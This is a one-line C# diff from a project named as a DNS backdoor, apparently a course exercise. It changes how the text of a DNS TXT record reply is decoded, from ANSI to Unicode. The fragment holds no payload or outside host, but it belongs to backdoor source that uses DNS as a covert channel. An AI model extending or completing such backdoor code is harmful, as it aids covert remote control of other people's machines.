@@ -205,7 +205,7 @@ namespace A06_6_DNS_Backdoor
 
                             if (pActualStringBytes != IntPtr.Zero)
                             {
-                                string? txtResult = Marshal.PtrToStringAnsi(pActualStringBytes);
+                                string? txtResult = Marshal.PtrToStringUni(pActualStringBytes);
                                 DnsRecordListFree(pResultList, 0);
                                 return txtResult;
                             }
